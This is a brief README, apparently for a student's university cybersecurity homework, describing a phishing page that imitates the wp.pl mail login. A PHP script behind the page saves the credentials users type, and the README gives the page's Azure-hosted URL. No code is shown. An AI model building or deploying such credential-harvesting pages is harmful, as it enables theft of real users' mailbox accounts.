# wp.pl-mailbox-phishing
Phishing of wp.pl mailbox access. Additional homework for my cybersecurity lessons at University.

I wrote script in PHP which saves data typed by user. Phishing is on free Azure hosting. There is only php script here, because i don't want to publish sb's site :) Script is launched after signing button is pressed.

Works fine. 
Result: http://wp-login.azurewebsites.net/
